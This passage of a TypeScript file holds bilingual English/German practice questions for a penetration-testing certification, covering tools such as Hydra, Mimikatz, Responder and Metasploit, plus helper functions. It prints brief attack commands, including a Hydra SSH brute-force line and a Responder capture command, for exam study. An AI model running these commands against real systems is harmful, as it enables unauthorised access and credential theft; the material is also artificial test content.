    questionEN: 'Which command uses Hydra for SSH brute-force?',
    questionDE: 'Welcher Befehl verwendet Hydra für SSH-Brute-Force?',
    options: ['hydra -L users.txt -P pass.txt ssh://10.0.0.1', 'nmap -sS 10.0.0.1', 'sqlmap -u http://site.com', 'msfconsole'],
    correctAnswer: 0,
    explanationEN: 'Hydra brute-forces network services. Syntax: hydra -L <userlist> -P <passlist> <service>://<target>',
    explanationDE: 'Hydra erzwingt Netzwerkdienste brutal.'
  },
  {
    id: 'mc74',
    domain: 'Tools',
    questionEN: 'What is the purpose of John the Ripper?',
    questionDE: 'Was ist der Zweck von John the Ripper?',
    options: ['Network scanning', 'Password hash cracking', 'Web application testing', 'Packet analysis'],
    correctAnswer: 1,
    explanationEN: 'John cracks password hashes from /etc/shadow, Windows SAM, etc. Supports wordlists, rules, incremental mode.',
    explanationDE: 'John knackt Passwort-Hashes von /etc/shadow, Windows SAM.'
  },
  {
    id: 'mc75',
    domain: 'Tools',
    questionEN: 'Which tool enumerates SMB shares on Windows networks?',
    questionDE: 'Welches Tool enumeriert SMB-Freigaben in Windows-Netzwerken?',
    options: ['sqlmap', 'enum4linux', 'Gobuster', 'Hashcat'],
    correctAnswer: 1,
    explanationEN: 'enum4linux extracts user lists, shares, groups, password policies from Windows/Samba. Wrapper for rpcclient, smbclient, nmblookup.',
    explanationDE: 'enum4linux extrahiert Benutzerlisten, Freigaben, Gruppen von Windows/Samba.'
  },
  {
    id: 'mc76',
    domain: 'Tools',
    questionEN: 'What does the -A flag do in Nmap?',
    questionDE: 'Was macht das -A-Flag in Nmap?',
    options: ['Scan all ports', 'Enable OS detection, version detection, script scanning, traceroute', 'UDP scan', 'Disable ping'],
    correctAnswer: 1,
    explanationEN: '-A enables aggressive scan with OS detection, version detection, script scanning, traceroute. Comprehensive but noisy.',
    explanationDE: '-A aktiviert aggressiven Scan mit OS-Erkennung, Versionserkennung, Skript-Scanning.'
  },
  {
    id: 'mc77',
    domain: 'Tools',
    questionEN: 'Which tool performs wireless network auditing?',
    questionDE: 'Welches Tool führt drahtlose Netzwerkaudits durch?',
    options: ['Nmap', 'Aircrack-ng suite', 'Burp Suite', 'Metasploit'],
    correctAnswer: 1,
    explanationEN: 'Aircrack-ng suite: airodump-ng (capture), aireplay-ng (inject), aircrack-ng (crack WEP/WPA). Essential for WiFi pentesting.',
    explanationDE: 'Aircrack-ng Suite: airodump-ng (erfassen), aireplay-ng (injizieren), aircrack-ng (knacken).'
  },
  {
    id: 'mc78',
    domain: 'Tools',
    questionEN: 'What is Responder used for in pentesting?',
    questionDE: 'Wofür wird Responder beim Pentesting verwendet?',
    options: ['Port scanning', 'LLMNR/NBT-NS poisoning to capture hashes', 'Web application testing', 'Wireless auditing'],
    correctAnswer: 1,
    explanationEN: 'Responder poisons LLMNR/NBT-NS requests, captures NetNTLM hashes when clients authenticate. Run: responder -I eth0',
    explanationDE: 'Responder vergiftet LLMNR/NBT-NS-Anfragen, erfasst NetNTLM-Hashes.'
  },
  {
    id: 'mc80',
    domain: 'Tools',
    questionEN: 'Which Metasploit payload provides interactive shell with advanced features?',
    questionDE: 'Welcher Metasploit-Payload bietet interaktive Shell mit erweiterten Funktionen?',
    options: ['cmd/windows/shell', 'windows/meterpreter/reverse_tcp', 'generic/shell_bind_tcp', 'payload/single/linux'],
    correctAnswer: 1,
    explanationEN: 'Meterpreter provides advanced post-exploitation: file transfer, keylogging, screenshot, pivoting, privilege escalation modules.',
    explanationDE: 'Meterpreter bietet erweiterte Post-Exploitation: Dateiübertragung, Keylogging, Screenshot.'
  },
  {
    id: 'mc81',
    domain: 'Tools',
    questionEN: 'What is the purpose of Impacket tools in pentesting?',
    questionDE: 'Was ist der Zweck von Impacket-Tools beim Pentesting?',
    options: ['Web scanning', 'Network protocol manipulation for Windows/AD attacks', 'Password cracking', 'Wireless auditing'],
    correctAnswer: 1,
    explanationEN: 'Impacket provides tools for SMB, RPC, Kerberos attacks: psexec, secretsdump, GetNPUsers, GetUserSPNs.',
    explanationDE: 'Impacket bietet Tools für SMB-, RPC-, Kerberos-Angriffe.'
  },
  {
    id: 'mc82',
    domain: 'Tools',
    questionEN: 'Which tool automates subdomain enumeration?',
    questionDE: 'Welches Tool automatisiert Subdomain-Enumeration?',
    options: ['Nmap', 'Sublist3r / Amass', 'Metasploit', 'Wireshark'],
    correctAnswer: 1,
    explanationEN: 'Sublist3r and Amass enumerate subdomains via search engines, DNS records, Certificate Transparency logs.',
    explanationDE: 'Sublist3r und Amass enumerieren Subdomains über Suchmaschinen, DNS-Records.'
  },
  {
    id: 'mc83',
    domain: 'Tools',
    questionEN: 'What does the -oA flag do in Nmap?',
    questionDE: 'Was macht das -oA-Flag in Nmap?',
    options: ['Scan all protocols', 'Output results in all formats (normal, XML, grepable)', 'Aggressive scan', 'Disable host discovery'],
    correctAnswer: 1,
    explanationEN: '-oA <basename> saves scan results in 3 formats: .nmap (normal), .xml (XML), .gnmap (grepable). Essential for reporting.',
    explanationDE: '-oA speichert Scan-Ergebnisse in 3 Formaten.'
  },
  {
    id: 'mc84',
    domain: 'Tools',
    questionEN: 'Which tool performs automated vulnerability scanning on web applications?',
    questionDE: 'Welches Tool führt automatisiertes Schwachstellen-Scanning bei Webanwendungen durch?',
    options: ['Nmap', 'OWASP ZAP / Nikto', 'Hashcat', 'Responder'],
    correctAnswer: 1,
    explanationEN: 'OWASP ZAP and Nikto automatically scan web apps for common vulnerabilities: XSS, SQLi, misconfigurations.',
    explanationDE: 'OWASP ZAP und Nikto scannen Web-Apps automatisch auf häufige Schwachstellen.'
  },
  {
    id: 'mc85',
    domain: 'Tools',
    questionEN: 'What is CrackMapExec used for?',
    questionDE: 'Wofür wird CrackMapExec verwendet?',
    options: ['Web testing', 'Post-exploitation tool for Windows/AD enumeration and exploitation', 'Port scanning', 'Wireless auditing'],
    correctAnswer: 1,
    explanationEN: 'CrackMapExec performs authentication testing, hash dumping, command execution across Windows networks via SMB/WMI/WinRM.',
    explanationDE: 'CrackMapExec führt Authentifizierungstests, Hash-Dumping, Befehlsausführung über Windows-Netzwerke durch.'
  },
  {
    id: 'mc86',
    domain: 'Tools',
    questionEN: 'Which tool extracts credentials from memory on Windows?',
    questionDE: 'Welches Tool extrahiert Credentials aus dem Speicher auf Windows?',
    options: ['Nmap', 'Mimikatz', 'Gobuster', 'Nikto'],
    correctAnswer: 1,
    explanationEN: 'Mimikatz extracts plaintext passwords, hashes, Kerberos tickets from LSASS memory. Requires admin/SYSTEM privileges.',
    explanationDE: 'Mimikatz extrahiert Klartext-Passwörter, Hashes, Kerberos-Tickets aus LSASS-Speicher.'
  },
  {
    id: 'mc87',
    domain: 'Tools',
    questionEN: 'What does Bloodhound visualize?',
    questionDE: 'Was visualisiert Bloodhound?',
    options: ['Network topology', 'Active Directory attack paths and relationships', 'Web application structure', 'Wireless networks'],
    correctAnswer: 1,
    explanationEN: 'Bloodhound maps AD relationships, identifies privilege escalation paths, shows quickest route to Domain Admins.',
    explanationDE: 'Bloodhound kartiert AD-Beziehungen, identifiziert Privilege-Escalation-Pfade.'
  },
  {
    id: 'mc88',
    domain: 'Tools',
    questionEN: 'Which command runs a stealth SYN scan with Nmap?',
    questionDE: 'Welcher Befehl führt einen Stealth-SYN-Scan mit Nmap aus?',
    options: ['nmap -sT target', 'nmap -sS target', 'nmap -sU target', 'nmap -sA target'],
    correctAnswer: 1,
    explanationEN: '-sS performs SYN scan (half-open), stealthier than full TCP connect (-sT). Requires root. -sU=UDP, -sA=ACK.',
    explanationDE: '-sS führt SYN-Scan durch, heimlicher als vollständiger TCP-Connect.'
  },
  {
    id: 'mc89',
    domain: 'Tools',
    questionEN: 'What is the purpose of PowerShell Empire?',
    questionDE: 'Was ist der Zweck von PowerShell Empire?',
    options: ['Network scanning', 'Post-exploitation framework using PowerShell', 'Web application testing', 'Password cracking'],
    correctAnswer: 1,
    explanationEN: 'Empire provides PowerShell agents for post-exploitation, lateral movement, credential harvesting on Windows. Fileless attacks.',
    explanationDE: 'Empire bietet PowerShell-Agenten für Post-Exploitation, laterale Bewegung.'
  },
  {
    id: 'mc90',
    domain: 'Tools',
    questionEN: 'Which tool performs automated exploit searching?',
    questionDE: 'Welches Tool führt automatisierte Exploit-Suche durch?',
    options: ['searchsploit (Exploit-DB)', 'Nmap', 'Wireshark', 'Hashcat'],
    correctAnswer: 0,
    explanationEN: 'searchsploit searches Exploit-DB database offline for exploits matching service/version. Example: searchsploit apache 2.4',
    explanationDE: 'searchsploit durchsucht Exploit-DB-Datenbank offline nach passenden Exploits.'
  },

  // DOMAIN 5: TOOLS & CODE ANALYSIS (20% - 18 questions)
  {
    id: 'mc79',
    domain: 'Tools',
    questionEN: 'Which tool is most appropriate for discovering vulnerabilities in a web application during black box testing?',
    questionDE: 'Welches Tool ist am geeignetsten, um Schwachstellen in einer Webanwendung während Black-Box-Tests zu entdecken?',
    options: ['OpenVAS', 'Nessus', 'sqlmap', 'Nikto'],
    correctAnswer: 3,
    explanationEN: 'Nikto is web-specific scanner detecting misconfigurations, outdated software, dangerous files/programs. OpenVAS/Nessus are general vulnerability scanners. SQLmap targets SQL injection specifically. Nikto provides comprehensive web app assessment.',
    explanationDE: 'Nikto ist webspezifischer Scanner, der Fehlkonfigurationen, veraltete Software, gefährliche Dateien/Programme erkennt.'
  },
  // Add remaining 17 questions for Tools domain...
];

// Export helper function to get questions by domain
export function getQuestionsByDomain(domain: MultipleChoiceQuestion['domain']) {
  return pt003MultipleChoiceQuestions.filter(q => q.domain === domain);
}

// Export helper function to get random questions
export function getRandomQuestions(count: number): MultipleChoiceQuestion[] {
  const shuffled = [...pt003MultipleChoiceQuestions].sort(() => 0.5 - Math.random());
  return shuffled.slice(0, count);
}

// Export summary statistics
export const pt003Statistics = {
  totalQuestions: pt003MultipleChoiceQuestions.length,
  totalPBQs: 10,
  totalToolChallenges: toolChallenges.length,
  domainBreakdown: {
    Planning: getQuestionsByDomain('Planning').length,
    InfoGathering: getQuestionsByDomain('InfoGathering').length,
    Attacks: getQuestionsByDomain('Attacks').length,
    Reporting: getQuestionsByDomain('Reporting').length,
    Tools: getQuestionsByDomain('Tools').length
  }
};
